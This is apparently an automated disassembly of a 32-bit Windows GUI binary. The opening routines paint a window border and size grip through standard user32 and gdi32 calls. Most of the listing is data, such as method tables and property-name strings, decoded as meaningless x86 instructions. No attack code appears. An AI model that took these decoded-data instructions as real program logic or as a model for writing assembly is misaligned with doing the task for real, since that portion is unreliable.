add esp 0xffffffbc
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
push 0xffffffec
mov eax [ ebp - 0x4 ]
call sub_4423cc
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4423cc
push eax
call GetWindowRect
mov eax [ ebp - 0x24 ]
neg eax
push eax
mov eax [ ebp - 0x28 ]
neg eax
push eax
lea eax [ ebp - 0x28 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
call sub_4423cc
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_42c7bb
push [ fs : edx ]
mov [ fs : edx ] esp
push esi
lea esi [ ebp - 0x28 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
test bl bl
je r-xdata
mov eax [ ebp - 0x1c ]
sub eax 0x2
push eax
mov eax [ ebp - 0x20 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x24 ]
add eax 0x2
push eax
mov eax [ ebp - 0x28 ]
add eax 0x2
push eax
mov eax [ ebp - 0x8 ]
push eax
call ExcludeClipRect
lea ecx [ ebp - 0x34 ]
mov dl 0x2
mov eax esi
call sub_42c298
lea eax [ ebp - 0x28 ]
push eax
push 0x0
lea ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_42c104
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4423cc
push eax
call ReleaseDC
retn
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_4423cc
push eax
call GetWindowLongA
test eax 0x100000
je r-xdata
test eax 0x200000
je r-xdata
push 0x2
call GetSystemMetrics
mov edi eax
push 0x3
call GetSystemMetrics
mov ebx eax
push 0xfffffffe
push 0xfffffffe
lea eax [ ebp - 0x18 ]
push eax
call InflateRect
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x44 ]
push eax
mov edx [ ebp - 0xc ]
sub edx ebx
mov eax [ ebp - 0x10 ]
sub eax edi
mov ecx [ ebp - 0x10 ]
call sub_4124e4
push esi
lea esi [ ebp - 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push 0xf
call GetSysColorBrush
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FillRect
sub_42c7e8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c823
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c82a
retn
mov eax [ rw-data ]
call sub_403224
mov eax rw-data
call sub_403f5c
sub_42c834
or al 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ecx * 8 + 0x42 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ecx * 8 + 0x42 ] cl
add [ esi - 0x37 ] ah
inc edx
add [ eax ] dl
add al [ eax ]
add [ eax ] dh
add [ ebx ] 0x60
fwait
inc ecx
add [ eax + 0x34 ] ah
inc eax
add [ esp + edx * 4 + 0x34680041 ] dh
inc eax
add [ edi + edi * 8 + 0x43 ] al
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ eax + eax * 2 + 0x2ee40044 ] cl
inc esp
add [ edi + esi * 8 ] cl
inc ebx
add [ esi + edi - 0x235fffbf ] bh
inc ebx
add [ eax + esi * 4 - 0x1c3fffbd ] bl
inc ebx
add [ ecx + edi * 4 - 0x6487ffbd ] dh
inc ecx
add [ eax - 0x68 ] ah
inc ecx
add [ eax - 0x68 ] bl
inc ecx
add [ eax + 0x1c00419b ] al
push cs
inc ebx
add al bh
sub [ eax + eax + 0x14 ] eax
das
inc esp
add [ eax + 0x2e ] ah
inc esp
add [ eax ] dl
scasd [ edi ]
inc ebx
add [ esp + 0x44 ] dh
add [ esp + 0x21ac0044 ] dl
inc esp
add [ eax - 0x52 ] bl
inc ebx
add [ esi + ebp * 4 + 0x43 ] bl
add [ eax - 0x22 ] dh
inc ebx
add [ esi + ebx * 8 - 0x4663ffbd ] bl
inc ebx
add ah dl
scasd [ edi ]
inc ebx
add [ eax ] ch
mov ebx 0xbaa00043
inc ebx
add [ ebp + edi * 4 - 0x439fffbd ] dh
inc ebx
add al ah
std
inc ebx
add [ eax ] ah
fild [ ebx ]
add [ edx ] ah
inc esp
add [ edx + 0x1db80044 ] bh
inc esp
add [ eax + 0x78004422 ] ah
push cs
inc ebx
add ah cl
0xf86c0043 0x43
sub_42c9b8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0x100042ca
add al [ eax ]
add [ eax + ecx * 8 ] dh
inc edx
add [ eax - 0x65 ] ah
inc ecx
add [ eax + 0x34 ] ah
inc eax
add [ esp + edx * 4 + 0x34680041 ] dh
inc eax
add [ edi + edi * 8 + 0x43 ] al
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ eax + eax * 2 + 0x2ee40044 ] cl
inc esp
add [ edi + esi * 8 ] cl
inc ebx
add [ esi + edi - 0x235fffbf ] bh
inc ebx
add [ eax + esi * 4 - 0x1c3fffbd ] bl
inc ebx
add [ ecx + edi * 4 - 0x6487ffbd ] dh
inc ecx
add [ eax - 0x68 ] ah
inc ecx
add [ eax - 0x68 ] bl
inc ecx
add [ eax + 0x1c00419b ] al
push cs
inc ebx
add al bh
sub [ eax + eax + 0x14 ] eax
das
inc esp
add [ eax + 0x2e ] ah
inc esp
add [ eax ] dl
scasd [ edi ]
inc ebx
add [ esp + 0x44 ] dh
add [ esp + 0x21ac0044 ] dl
inc esp
add [ eax - 0x52 ] bl
inc ebx
add [ esi + ebp * 4 + 0x43 ] bl
add [ eax - 0x22 ] dh
inc ebx
add [ esi + ebx * 8 - 0x4663ffbd ] bl
inc ebx
add ah dl
scasd [ edi ]
inc ebx
add [ eax ] ch
mov ebx 0xbaa00043
inc ebx
add [ ebp + edi * 4 - 0x439fffbd ] dh
inc ebx
add al ah
std
inc ebx
add [ eax ] ah
fild [ ebx ]
add [ edx ] ah
inc esp
add [ edx + 0x1db80044 ] bh
inc esp
add [ eax + 0x78004422 ] ah
push cs
inc ebx
add ah cl
0xf86c0043 0x43
sub_42d029
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
popad
dec ebp
outsd
jbe r-xdata
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ eax + 0x36 ] dl
inc esp
dec esp
popad
jns r-xdata
dec edi
outsb
push ebx
je r-xdata
int3
inc ebx
jne r-xdata
or [ ebx + 0x74 ] dl
inc ebx
jb r-xdata
add al bl
fadd [ ebx ]
rcl al 0x1
inc ebx
xor [ eax ] eax
push eax
inc esp
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah bl
rol [ edx ] 0x1
add eax 0x6f546c74
jo r-xdata
add [ eax - 0x68 ] bl
inc ecx
add [ eax + 0x6400419b ] al
adc eax [ ebx ]
push 0x640043cb

insb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ edx + edx * 8 ] bh
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
rol [ edx ] 0x1
sub dl dl
inc edx
add [ ecx + eax - 0x7df00000 ] cl
inc ebx
add [ eax - 0x65 ] ah
inc ecx
add [ eax + 0x34 ] ah
inc eax
add [ esp + edx * 4 + 0x34680041 ] dh
inc eax
add al bh
iretd
inc esp
jb r-xdata
or [ esp + ebp * 2 + 0x42 ] dh
je r-xdata
push 0x42d1
je r-xdata
mov ah 0x73
inc ebx
add al dh
add [ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080034 ] al
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx - 0x75 ] bp
shl al 0xd0
inc edx
add [ ebx ] al
or edx [ esp + edx * 2 + 0x65 ]
js r-xdata
js r-xdata
outsd
insd
add [ esi + edi + 0x167c0041 ] bh
inc ebx
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ecx
add [ eax - 0x68 ] ah
inc ecx
inc ebx
add [ eax + ebx + 0x43 ] ah
add [ eax ] cl
mov al 0x43
add [ ecx + edi * 4 - 0x6487ffbd ] dh
rol [ ebx ] 0x1
mov esp 0x7c00413e
push ss
jb r-xdata
je r-xdata
sbb [ fs : ebx ] al
or [ eax - 0x464bffbd ] dh
inc ebx
add [ eax - 0x65 ] bh
outsd
je r-xdata
inc edx
sub_42d2e2
inc ebx
add [ esp + ecx * 8 ] dh
inc ebx
add [ eax ] dl
scasd [ edi ]
inc ebx
add [ esi + esi * 4 + 0x43 ] dl
add [ eax - 0x1fffbc4b ] bh
mov esi 0xae580043
inc ebx
add [ esi + ebp * 4 + 0x43 ] bl
add [ eax - 0x22 ] dh
inc ebx
add [ esi + ebx * 8 + 0x17840043 ] bl
inc ebx
add ah dl
scasd [ edi ]
inc ebx
add [ eax ] ch
mov ebx 0xbaa00043
inc ebx
add [ ebp + edi * 4 - 0x439fffbd ] dh
inc ebx
add [ esi + ecx * 8 + 0x43 ] ah
add [ edi ] al
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
inc ebx
je r-xdata
add [ eax + 0x43bd ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050011 ] al
outsd
insb
outsd
jb r-xdata
add [ eax ] dl
inc eax
add [ ebp + 0x1 ] ch
add bh bh
pop esp
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push cs
add [ eax ] cl
inc ecx
jne r-xdata
insb
jae r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0012 ] al
outsd
outsd
inc ebx
add [ eax + eax ] dh
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
add bh bh
push 0x1004317
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax + 0x67 ] al
inc ebx
add [ ebx ] bl
add bh bh
loopne r-xdata
add [ eax ] dl
add dh bh
add [ fs : eax ] al
inc [ eax ]
fadd [ ebx ]
add [ eax ] al
add [ eax + 0x1 ] al
push ss
add [ edi ] al
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
call 0x68431890
add [ eax ] eax
jb r-xdata
add [ eax ] ah
fild [ ebx ]
mov al [ 0x140043c0 ]
rol [ ebx ] 0x88
mov cl 0x43
add ah dh
rol [ ebx ] 0x80
adc eax 0x13fc0043
inc ebx
add [ esi ] al
push esp
dec esp
popad
bound esp [ ebp + 0x6c ]
nop
dec esp
rol [ edx ] cl
pop es
push es
push esp
dec esp
popad
bound esp [ ebp + 0x6c ]
lodsb [ esi ]
rol [ edx ] cl
cmp dl dl
inc edx
add [ edx ] dh
add [ eax ] cl
push ebx
je r-xdata
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
jo r-xdata
add [ eax ] al
add [ 0x72440800 ] dl
popad
dec ebp
outsd
add [ gs : eax ] dl
inc eax
imul ebp [ esi + 0x74 ] 0x43672873
add [ edx ] bh
add bh bh
jpe r-xdata
or al 0x0
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
push 0x6100436e
add [ eax ] al
jmp [ eax ]
add [ eax ] al
add [ eax ] al
inc ecx
add [ ecx + eax ] ch
[ eax + 0x17 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc eax [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
[ edi + edx + 0x10043 ]
jae r-xdata
add bh bh
lodsb [ esi ]
pop ss
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x460c0017 ] al
outsd
arpl [ ebp + 0x73 ] si
inc ebx
outsd
outsb
je r-xdata
jb r-xdata
inc eax
add [ ecx ] bl
add bh bh
clc
mov esp 0x10043
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
outsd
insb
fsubr [ esi + 0x680041 ]
add bh bh
sar [ ebx + eax * 2 + 0x43bcd000 ] 0x0
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb [ eax ] al
add al 0x46
outsd
outsb
je r-xdata
outsb
jae r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al [ eax ]
or eax [ ebx + 0x6f ]
insd
inc ebx
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
add [ eax + 0x1 ] al
outsb
je r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
adc [ eax ] al
mov al [ 0xffffffffdc004317 ]
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
add [ eax ] al
and eax [ eax ]
or [ edi + 0x6f ] dl
jb r-xdata
outsb
jae r-xdata
je r-xdata
jo r-xdata
adc [ eax ] al
0x40ff0000 0x43bd
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al 0x0
push cs
push eax
popad
jb r-xdata
add [ eax ] al
and [ esi ] 0x0
or cl [ edi + 0x6e ]
push edi
add [ eax ] eax
jmp [ eax ]
popad
jb r-xdata
pop ss
inc ebx
add [ eax + 0xff0001 ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x540b0020 ] al
jb r-xdata
add [ eax - 0x23ffbce9 ] ah
rol [ edx ] 0x1
outsb
add [ eax ] eax
jmp [ eax ]
je r-xdata
outsb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001f ] al
push 0x6948776f
outsb
outsb
je r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
jb r-xdata
jo r-xdata
jb r-xdata
outsb
adc [ eax ] al
jo r-xdata
inc eax
add [ ecx + 0x1cff0000 ] bl
mov ebp 0xbce40043
inc ebx
add [ eax ] dl
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
add [ eax + 0x4f09002d ] al
outsb
dec ebp
outsd
jne r-xdata
int3
outsd
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0025 ] al
outsb
inc ebx
outsd
outsb
je r-xdata
adc [ ecx ] al
and [ ecx ] al
add bh bh
and [ ecx ] al
add bh bh
sbb ah 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070024 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0e00
push ds
add [ 0x776f6853 ] cl
inc ecx
arpl [ ebx + 0x65 ] sp
insb
inc ebx
push 0x10007261
inc eax
pop ss
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add bh bh
rcl [ edi ] 0x43
sbb eax [ eax ]
or dl [ eax + 0x61 ]
jb r-xdata
add [ ecx ] 0x0
add [ eax ] al
jo r-xdata
lodsb [ esi ]
inc esp
add [ eax + eax ] bh
inc [ ebx + edi * 4 + 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax 0x6f500900
inc esp
outsd
arpl [ ebx + 0x18 ] bp
jb r-xdata
push ebp
je r-xdata
inc esp
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ edi + 0x6e ] ecx
jno r-xdata
add [ eax ] al
js r-xdata
or [ ebp + 0x63 ] ah
dec esi
outsd
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0031 ] al
outsb
add bh bh
js r-xdata
adc [ ecx ] al
add [ ecx ] 0x0
inc [ eax + 0x1ff0001 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002e ] al
outsb
dec ebp
outsd
jne r-xdata
push ebx
je r-xdata
xor [ ecx ] 0x0
or ecx [ edi + 0x6e ]
jb r-xdata
inc esp
jo r-xdata
outsd
ja r-xdata
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
arpl [ ebx + 0x60 ] bp
jb r-xdata
add [ eax + 0x4f0a0028 ] al
outsb
inc esp
jb r-xdata
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002b ] al
add [ eax ] al
dec edi
jbe r-xdata
pushad
push eax
outsd
jo r-xdata
sbb al 0xe2
popad
insb
or esp [ ebp + 0x63 ]
push ebp
jo r-xdata
inc ebx
add ah ah
inc esp
add [ eax + 0x42da ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebx * 8 + 0x42 ] dh
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002f ] al
outsb
dec ebp
outsd
jne r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ edi + ecx * 2 ] cl
inc ebp
outsb
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
adc [ ecx ] al
js r-xdata
jae r-xdata
add al bl
add [ eax ] al
outsb
dec ebp
outsd
jne r-xdata
jb r-xdata
popad
inc ebp
outsb
inc esp
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090029 ] al
outsb
jo r-xdata
add [ esi + edi - 0x235fffbf ] bh
jb r-xdata
inc ebx
and [ edx ] al
add [ eax ] al
xor al 0x7e
inc esp
jb r-xdata
jb r-xdata
arpl [ gs : esi + 0x6f ] cx
dec esp
popad
jbe r-xdata
or esp [ ebp + 0x63 ]
dec esp
outsd
ja r-xdata
jb r-xdata
or ecx [ edi + 0x6e ]
push ebx
je r-xdata
add [ eax ] al
xor [ eax ] 0x0
jo r-xdata
push ebp
add [ ebx ] cl
dec edi
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0027 ] al
outsb
inc esp
jb r-xdata
call 0x241d765
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe941d761
add [ eax ] al
inc [ ecx ]
adc [ ecx ] al
sub [ ecx ] al
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : edx ] cl
dec edi
outsb
jle r-xdata
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
clc
fadd [ edx ]
add ecx [ 0x69644554 ]
je r-xdata
add [ eax ] al
add ah dh
fadd [ edx ]
and [ ebx + eax * 2 ] dh
add [ ecx ] al
inc ecx
add [ eax - 0x63ffbc24 ] ah
mov al 0x43
add al al
jecxz r-xdata
jb r-xdata
mov eax eax
mov ecx ds
inc edx
inc ecx
add [ eax - 0x68 ] bl
inc ecx
add [ eax - 0x53ffbe65 ] al
sbb [ ebx ] eax
clc
sub [ eax + eax + 0x14 ] eax
das
inc esp
add [ eax + 0x2e ] ah
inc esp
add [ eax ] dl
scasd [ edi ]
inc ebx
add [ esp + 0x44 ] dh
add [ esp + 0x21ac0044 ] dl
inc esp
add [ eax - 0x52 ] bl
inc ebx
add [ esi + ebp * 4 + 0x43 ] bl
add [ eax - 0x22 ] dh
inc ebx
add [ esi + ebx * 8 + 0x1a740043 ] bl
inc ebx
add [ eax - 0x65 ] ah
add [ edi + esi * 8 ] cl
inc ebx
inc esp
inc ebx
je r-xdata
add [ esi + 0x200042da ] ah
add al [ eax ]
add [ esi + edi * 2 ] dh
inc edx
add [ eax ] al
add [ eax ] al
push 0x61437261
jae r-xdata
add ah dl
scasd [ edi ]
inc ebx
add [ eax ] ch
mov ebx 0xbaa00043
inc ebx
add [ ebp + edi * 4 - 0x439fffbd ] dh
inc ebx
add al ah
std
inc ebx
add [ eax ] ah
fild [ ebx ]
add [ edx ] ah
inc esp
add [ edx + 0x1db80044 ] bh
inc esp
add [ eax + 0x38004422 ] ah
in al 0x43
add ah cl
0xf86c0043 0x43
inc ebx
add [ edx + ebx + 0x43 ] dh
add [ ecx + edi * 4 - 0x6487ffbd ] dh
inc ecx
add [ eax - 0x68 ] ah
inc eax
add [ eax - 0x43ffbcdf ] cl
xor [ eax ] eax
fdiv [ ecx ]
inc eax
add [ edx ] bl
xchg esp eax
inc ecx
add [ eax + 0x34 ] ch
popad
jae r-xdata
insb
jae r-xdata
inc ecx
add [ eax + 0x34 ] ah
inc eax
add [ esp + edx * 4 + 0x34680041 ] dh
pushad
fwait
add [ eax ] eax
add [ eax ] al
add [ edx ] al
inc ebx
add [ eax + esi * 4 - 0x1c3fffbd ] bl
inc ebx
or [ ebx + 0x74 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ror [ ecx + ebx * 8 + 0x42 ] 0x0
sub_42da24
xchg esp eax
push ds
inc ebx
add [ eax + 0x1f ] dl
inc ebx
add al al
pop ds
inc ebx
add [ ecx + edi * 8 ] al
inc ebx
add [ eax ] cl
stc
inc ebx
add al al
test [ ebx ] sub_432064
loopne r-xdata
sbb al 0x43
add [ eax + 0x1c ] dh
inc ebx
add [ ebx + 0x1d5c0043 ] ah
inc ebx
add [ eax ] cl
add [ eax ] dh
add [ eax ] dl
mov al 0x1a
mov al 0xe
mov al 0x11
mov ebp 0x7bb012
mov bl 0xff
shl [ ecx ] 0x43
add [ eax ] al
and al [ ebx ]
jl r-xdata
inc esp
add [ eax - 0x4bffbbff ] dh
xor eax 0x205c0044
inc esp
add [ ebx + 0x44 ] cl
add [ edx + ebx + 0x43 ] dl
add [ eax + 0x4c00431c ] dl
sbb al 0x43
add al bh
sbb eax 0x1cc00043
inc ebx
mov eax eax
mov eax 0x70042da
inc ebx
add [ edx ] dh
inc ebx
add [ edx + 0x43 ] bl
add [ eax - 0xfffbcde ] bh
and al [ ebx ]
and [ fs : ebx ] eax
or edx [ ebx + eax * 2 + 0x75 ]
jae r-xdata
add [ eax + 0x34 ] ch
outsd
insd
inc ebp
imul esi [ fs : esp + ecx * 4 - 0x27 ] 0x81e80042
inc ebx
add [ eax + eax ] cl
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
inc eax
add [ eax - 0x43ffbcdf ] cl
xor [ eax ] eax
fdiv [ ecx ]
inc eax
add [ edx ] bl
inc ebx
and [ edx ] al
add [ eax ] al
inc eax
fld [ edx ]
pushad
fwait
inc ecx
add [ eax + 0x34 ] ah
inc eax
add [ esp + edx * 4 + 0x34680041 ] dh
or edx [ ebx + eax * 2 + 0x75 ]
jae r-xdata
outsd
insd
inc ebp
imul esi [ fs : ebx + ecx * 4 - 0x40 ] r-xdata
pop es
add [ edi + esi * 8 ] cl
inc ebx
add [ esi + edi - 0x235fffbf ] bh
inc ebx
add [ eax + esi * 4 - 0x1c3fffbd ] bl
inc ebx
add [ ecx + edi * 4 - 0x6487ffbd ] dh
inc ecx
add [ eax - 0x68 ] ah
inc ecx
add [ eax - 0x68 ] bl
inc ecx
add [ eax - 0x53ffbe65 ] al
sbb [ ebx ] eax
clc
sub [ eax + eax + 0x14 ] eax
das
inc esp
add [ eax + 0x2e ] ah
inc esp
add [ eax ] dl
scasd [ edi ]
inc ebx
add [ esp + 0x44 ] dh
in al 0x2e
inc esp
insb
jae r-xdata
add [ eax ] dl
inc eax
add [ ecx + eax + 0x2600ff00 ] ah
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ eax ] al
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
inc [ eax ]
inc esp
loop r-xdata
fild [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp al 0xdc
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
fadd [ edx ]
add [ esp + 0x21ac0044 ] dl
inc esp
add [ eax - 0x52 ] bl
inc ebx
add [ esi + ebp * 4 + 0x43 ] bl
add [ eax - 0x22 ] dh
inc ebx
add [ esi + ebx * 8 + 0x1a740043 ] bl
inc ebx
add ah dl
scasd [ edi ]
inc ebx
add [ eax ] ch
mov ebx 0xbaa00043
inc ebx
add [ ebp + edi * 4 - 0x439fffbd ] dh
inc ebx
add al ah
std
inc ebx
add [ eax ] ah
fild [ ebx ]
add [ edx ] ah
inc esp
add [ edx + 0x1db80044 ] bh
inc esp
add [ eax + 0x38004422 ] ah
in al 0x43
add ah cl
0xf86c0043 0x43
inc esp
add ah ah
inc esp
sub_42dbe0
xchg esp eax
push ds
inc ebx
add [ eax + 0x1f ] dl
inc ebx
add al al
pop ds
inc ebx
add [ ecx + edi * 8 ] al
inc ebx
add [ eax ] cl
stc
inc ebx
add al al
test [ ebx ] sub_432064
loopne r-xdata
sbb al 0x43
add [ eax + 0x1c ] dh
inc ebx
add [ ebx + 0x1d5c0043 ] ah
inc ebx
add [ 0x69644554 ] al
je r-xdata
inc esp
add [ eax - 0x4bffbbff ] dh
xor eax 0x205c0044
inc esp
add [ ebx + 0x44 ] cl
add [ edx + ebx + 0x43 ] dl
add [ eax + 0x4c00431c ] dl
sbb al 0x43
add al bh
sbb eax 0x1cc00043
inc ebx
inc ebx
add [ eax ] al
and al [ eax + eax - 0x44 ]
and al [ eax + eax - 0x48 ]
sbb eax 0x22a00044
inc esp
add [ eax ] bh
in al 0x43
add ah cl
0xf86c0043 0x43
sar [ esp + ebx * 8 ] 0x42
add [ edi ] al
add eax 0x69644554
je r-xdata
add [ eax + 0x1 ] al
fild [ edx ]
mov ah 0xda
inc edx
add [ ecx ] al
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
outsb
outsb
jb r-xdata
push ebx
insb
arpl [ gs : eax + eax + 0x10 ] si
inc eax
add [ edi ] cl
add al [ eax ]
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
bound eax [ ecx ]
add bh bh
and al 0x31
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add [ eax ] al
str [ edx ]
inc edx
jbe r-xdata
insb
jae r-xdata
push cs
add [ eax ] cl
inc ecx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
jge r-xdata
jl r-xdata
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
add [ eax ] al
adc al [ eax ]
or al [ edx + 0x65 ]
jbe r-xdata
insb
inc ebp
jae r-xdata
or eax 0x75410a00
je r-xdata
add [ ecx ] 0x0
add [ eax ] al
add [ eax + 0x6e ] ch
inc ebx
add [ ecx ] ah
add bh bh
and [ edi - 0x5043ffbd ] ch
inc ebx
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
je r-xdata
add [ ebp + 0x1 ] ah
add bh bh
push esp
xor [ eax + eax + 0x1 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or [ edx + 0x65 ] eax
jbe r-xdata
pop eax
